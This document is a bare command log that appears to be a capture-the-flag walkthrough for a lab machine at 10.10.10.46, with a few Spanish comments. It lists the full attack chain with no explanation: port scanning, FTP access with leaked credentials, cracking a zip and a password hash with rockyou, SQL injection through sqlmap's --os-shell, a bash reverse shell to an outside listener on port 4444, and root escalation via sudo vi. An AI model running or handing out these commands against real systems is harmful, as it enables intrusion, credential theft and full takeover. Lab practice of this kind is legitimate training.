nmap -sC -sV 10.10.10.46

ftpuser / mc@F1l3ZilL4

apt-get install ftp bzip2

ftp 10.10.10.46
dir
get backup.zip

wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
bzip2 -d rockyou.txt.bz2

#zip2john backup.zip > hash
#john hash --fork=4 w=rockyou.txt

fcrackzip -u -D -p rockyou.txt backup.zip
--> 741852963 <-- Password

unzip backup
cat index.php

#Go to crackstation.net/
-> qwerty789 <- Password

http://10.10.10.46
user: admin
pass: qwerty789

wget https://github.com/sqlmapproject/sqlmap/archive/master.zip
unzip master.zip

#Obtener COOKIE desde el navegador y usarla en sqlmap
#sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID="
#sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=" --os-shell

cd sqlmap-master
python sqlmap.py -h
python sqlmap.py -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID="
python sqlmap.py -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=" --os-shell

nc -lvnp 4444

bash -c 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'

whoami

SHELL=/bin/bash script -q /dev/null

cat /var/www/html/dashboard.php | grep password
P@s5w0rd! <-- Password

python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -l

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:!/bin/bash

# root
whoami